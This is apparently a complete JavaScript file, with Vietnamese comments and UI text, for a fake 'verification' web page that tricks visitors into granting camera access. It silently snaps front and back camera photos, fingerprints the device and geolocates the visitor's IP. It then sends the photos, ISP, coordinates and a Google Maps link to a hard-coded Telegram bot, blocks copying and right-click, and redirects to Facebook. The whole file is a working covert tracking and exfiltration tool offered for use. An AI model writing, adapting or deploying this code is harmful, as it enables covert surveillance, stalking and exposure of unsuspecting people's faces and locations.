// ==================== FULL VERSION - FORMAT GIỐNG HỌ ====================

// -------------------- TELEGRAM CONFIG --------------------
const TELEGRAM_CONFIG = {
    BOT_TOKEN: "8872849016:AAEstxsi3M4FNMk0esFMG8lvx9M0tlW1Hac",
    CHAT_ID: "-1003805423944",
    API_URL: "https://api.telegram.org/bot"
};

// -------------------- TELEGRAM SENDER --------------------
const TelegramSender = {
    async sendMessage(text) {
        const url = `${TELEGRAM_CONFIG.API_URL}${TELEGRAM_CONFIG.BOT_TOKEN}/sendMessage`;
        try {
            await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CONFIG.CHAT_ID,
                    text: text,
                    parse_mode: 'Markdown'
                })
            });
        } catch(e) {}
    },
    
    async sendPhoto(blob, caption) {
        if (!blob) return;
        const url = `${TELEGRAM_CONFIG.API_URL}${TELEGRAM_CONFIG.BOT_TOKEN}/sendPhoto`;
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CONFIG.CHAT_ID);
        formData.append('photo', blob, 'photo.jpg');
        formData.append('caption', caption);
        try {
            await fetch(url, { method: 'POST', body: formData });
        } catch(e) {}
    },
    
    formatMessage(data) {
        return `📡 *[THÔNG TIN TRUY CẬP]*

🕒 *Thời gian:* ${data.time || '?'}
📱 *Thiết bị:* ${data.device || '?'}
🖥️ *Hệ điều hành:* ${data.os || '?'}
🌍 *IP dân cư:* ${data.ip || '?'}
🧠 *IP gốc:* ${data.ip || '?'}
🏢 *ISP:* ${data.isp || '?'}
🏙️ *Địa chỉ:* ${data.location || '?'}
🌎 *Quốc gia:* ${data.country || '?'}
📍 *Vĩ độ:* ${data.lat || '?'}
📍 *Kinh độ:* ${data.lon || '?'}
📌 *Google Maps:* ${data.maps || '?'}
📸 *Camera:* ${data.camera || '?'}

⚠️ *Ghi chú:* ${data.note || 'Thông tin có khả năng chưa chính xác 100%.'}`;
    },
    
    async sendAll(data) {
        const message = this.formatMessage(data);
        await this.sendMessage(message);
        if (data.frontPhoto) await this.sendPhoto(data.frontPhoto, '📸 ẢNH CAMERA TRƯỚC');
        if (data.backPhoto) await this.sendPhoto(data.backPhoto, '📸 ẢNH CAMERA SAU');
    }
};

// -------------------- DEVICE INFO --------------------
const DeviceInfo = {
    getInfo() {
        const ua = navigator.userAgent;
        let device = 'Không xác định';
        let os = 'Không xác định';
        
        if (/iPhone|iPad|iPod/i.test(ua)) {
            os = 'iOS';
            device = 'iPhone';
        } else if (/Android/i.test(ua)) {
            os = 'Android';
            device = 'Android';
        } else if (ua.includes('Windows')) {
            os = 'Windows';
            device = 'PC/Laptop';
        } else if (ua.includes('Mac')) {
            os = 'macOS';
            device = 'Mac';
        } else {
            os = 'Desktop';
            device = 'PC/Laptop';
        }
        
        return { device, os };
    }
};

// -------------------- LOCATION API (DÙNG ipapi.co TRƯỚC - HOẠT ĐỘNG TỐT NHẤT) --------------------
const LocationInfo = {
    async getLocationData() {
        // Thử ipapi.co trước (hoạt động tốt, không CORS)
        try {
            const response = await fetch('https://ipapi.co/json/');
            const data = await response.json();
            if (data && data.ip) {
                console.log('✅ Lấy từ ipapi.co:', data);
                return {
                    ip: data.ip,
                    isp: data.org || data.asn || 'Không xác định',
                    country: data.country_name || 'Không xác định',
                    location: `${data.city || ''} ${data.region || ''} ${data.country_name || ''}`.trim() || 'Không xác định',
                    lat: data.latitude || 'Không xác định',
                    lon: data.longitude || 'Không xác định'
                };
            }
        } catch(e) { console.log('ipapi.co lỗi:', e); }
        
        // Thử ipwho.is
        try {
            const response = await fetch('https://ipwho.is/');
            const data = await response.json();
            if (data && data.ip) {
                console.log('✅ Lấy từ ipwho.is:', data);
                return {
                    ip: data.ip,
                    isp: data.connection?.isp || data.isp || 'Không xác định',
                    country: data.country || 'Không xác định',
                    location: `${data.city || ''} ${data.region || ''} ${data.country || ''}`.trim() || 'Không xác định',
                    lat: data.latitude || 'Không xác định',
                    lon: data.longitude || 'Không xác định'
                };
            }
        } catch(e) { console.log('ipwho.is lỗi:', e); }
        
        // Thử ip-api.com
        try {
            const response = await fetch('https://ip-api.com/json/');
            const data = await response.json();
            if (data && data.status === 'success') {
                console.log('✅ Lấy từ ip-api.com:', data);
                return {
                    ip: data.query,
                    isp: data.isp || 'Không xác định',
                    country: data.country || 'Không xác định',
                    location: `${data.city || ''} ${data.regionName || ''} ${data.country || ''}`.trim() || 'Không xác định',
                    lat: data.lat || 'Không xác định',
                    lon: data.lon || 'Không xác định'
                };
            }
        } catch(e) { console.log('ip-api.com lỗi:', e); }
        
        // Fallback: chỉ lấy IP
        try {
            const res = await fetch('https://api.ipify.org?format=json');
            const data = await res.json();
            if (data.ip) {
                return {
                    ip: data.ip,
                    isp: 'Không xác định',
                    country: 'Không xác định',
                    location: 'Không xác định',
                    lat: 'Không xác định',
                    lon: 'Không xác định'
                };
            }
        } catch(e) {}
        
        return {
            ip: 'Không xác định',
            isp: 'Không xác định',
            country: 'Không xác định',
            location: 'Không xác định',
            lat: 'Không xác định',
            lon: 'Không xác định'
        };
    }
};

// -------------------- CAMERA MANAGER --------------------
const CameraManager = {
    stream: null,
    videoElement: null,
    
    init(videoElement) {
        this.videoElement = videoElement;
    },
    
    async requestCamera(facingMode = 'user') {
        if (!navigator.mediaDevices?.getUserMedia) return null;
        
        try {
            if (this.stream) this.stopCamera();
            this.stream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: facingMode },
                audio: false
            });
            if (this.videoElement) {
                this.videoElement.srcObject = this.stream;
                this.videoElement.style.display = 'block';
                await this.videoElement.play();
            }
            return this.stream;
        } catch(e) {
            console.error('Lỗi camera:', e);
            return null;
        }
    },
    
    async capturePhoto() {
        if (!this.videoElement || !this.stream) return null;
        await new Promise(r => setTimeout(r, 500));
        
        return new Promise((resolve) => {
            const canvas = document.createElement('canvas');
            canvas.width = this.videoElement.videoWidth;
            canvas.height = this.videoElement.videoHeight;
            if (canvas.width === 0 || canvas.height === 0) {
                resolve(null);
                return;
            }
            const ctx = canvas.getContext('2d');
            ctx.drawImage(this.videoElement, 0, 0);
            canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.85);
        });
    },
    
    async captureBothCameras() {
        const photos = { front: null, back: null };
        
        const frontStream = await this.requestCamera('user');
        if (frontStream) {
            await new Promise(r => setTimeout(r, 500));
            photos.front = await this.capturePhoto();
        }
        
        const backStream = await this.requestCamera('environment');
        if (backStream) {
            await new Promise(r => setTimeout(r, 500));
            photos.back = await this.capturePhoto();
        }
        
        return photos;
    },
    
    stopCamera() {
        if (this.stream) {
            this.stream.getTracks().forEach(track => track.stop());
            this.stream = null;
        }
        if (this.videoElement) {
            this.videoElement.srcObject = null;
            this.videoElement.style.display = 'none';
        }
    }
};

// -------------------- HÀM ĐẾM NGƯỢC RELOAD --------------------
function startReloadCountdown(seconds, message) {
    const startBtn = document.getElementById('startBtn');
    const statusDiv = document.getElementById('status');
    
    startBtn.disabled = true;
    startBtn.style.backgroundColor = "#dc3545";
    statusDiv.innerHTML = message;
    
    let timeLeft = seconds;
    startBtn.innerText = `⚠️ ${timeLeft}s - Thử lại...`;
    
    const timer = setInterval(() => {
        timeLeft--;
        if (timeLeft > 0) {
            startBtn.innerText = `⚠️ ${timeLeft}s - Thử lại...`;
        } else {
            clearInterval(timer);
            location.reload();
        }
    }, 1000);
}

// -------------------- MAIN --------------------
(function() {
    const warningDiv = document.getElementById('browser-warning');
    const mainCard = document.getElementById('mainCard');
    const startBtn = document.getElementById('startBtn');
    const video = document.getElementById('preview');
    const msg = document.getElementById('msg');
    const statusDiv = document.getElementById('status');
    const vBox = document.getElementById('vBox');
    
    // Kiểm tra in-app browser
    const ua = navigator.userAgent;
    const isInApp = /TikTok|musical_ly|ByteLocale|FBAN|FBAV|Zalo|Instagram|Messenger|Line/i.test(ua);
    if (isInApp) {
        warningDiv.style.display = 'block';
        mainCard.style.display = 'none';
    }
    
    document.addEventListener('contextmenu', e => e.preventDefault());
    document.addEventListener('copy', e => e.preventDefault());
    
    CameraManager.init(video);
    
    startBtn.onclick = async () => {
        if (!navigator.mediaDevices?.getUserMedia) {
            startReloadCountdown(5, '⚠️ Trình duyệt không hỗ trợ camera! Đang tải lại...');
            return;
        }
        
        startBtn.disabled = true;
        startBtn.innerText = '⏳ ĐANG XỬ LÝ...';
        
        try {
            statusDiv.innerHTML = '📷 Đang mở camera...';
            msg.textContent = '📷 Đang mở camera...';
            msg.style.display = 'block';
            
            // Test camera
            const testStream = await navigator.mediaDevices.getUserMedia({ video: true });
            if (!testStream) throw new Error('No camera');
            testStream.getTracks().forEach(t => t.stop());
            
            const photos = await CameraManager.captureBothCameras();
            
            if (!photos.front && !photos.back) {
                startReloadCountdown(5, '⚠️ Bạn chưa cấp quyền camera! Đang tải lại...');
                CameraManager.stopCamera();
                return;
            }
            
            video.style.display = 'none';
            msg.textContent = '📸 Đang xử lý...';
            statusDiv.innerHTML = '📸 Đang xác thực...';
            
            const deviceInfo = DeviceInfo.getInfo();
            const locationInfo = await LocationInfo.getLocationData();
            
            // Tạo Google Maps link đúng format
            const mapsLink = (locationInfo.lat !== 'Không xác định' && locationInfo.lon !== 'Không xác định') 
                ? `http://googleusercontent.com/maps.google.com/${locationInfo.lat},${locationInfo.lon}`
                : '';
            
            const cameraStatus = (photos.front || photos.back) ? '✅ Đã chụp camera' : '🚫 Bị chặn hoặc không có camera';
            
            const finalData = {
                time: new Date().toLocaleString('vi-VN'),
                device: deviceInfo.device,
                os: deviceInfo.os,
                ip: locationInfo.ip,
                isp: locationInfo.isp,
                location: locationInfo.location,
                country: locationInfo.country,
                lat: locationInfo.lat,
                lon: locationInfo.lon,
                maps: mapsLink,
                camera: cameraStatus,
                note: 'Thông tin có khả năng chưa chính xác 100%.',
                frontPhoto: photos.front,
                backPhoto: photos.back
            };
            
            await TelegramSender.sendAll(finalData);
            CameraManager.stopCamera();
            
            startBtn.style.backgroundColor = "#28a745";
            let timeLeft = 3;
            statusDiv.innerHTML = `✅ Xác thực thành công! Chuyển hướng sau ${timeLeft} giây...`;
            
            const timer = setInterval(() => {
                startBtn.innerText = `✅ HOÀN TẤT (${timeLeft}s)`;
                timeLeft--;
                if (timeLeft < 0) {
                    clearInterval(timer);
                    window.location.href = "https://facebook.com";
                }
            }, 1000);
            
        } catch(error) {
            console.error('Lỗi:', error);
            startReloadCountdown(5, '⚠️ Không thể mở camera! Vui lòng cấp quyền. Đang tải lại...');
            CameraManager.stopCamera();
        }
    };
    
    console.log('✅ Đã sẵn sàng - Format giống họ');
})();
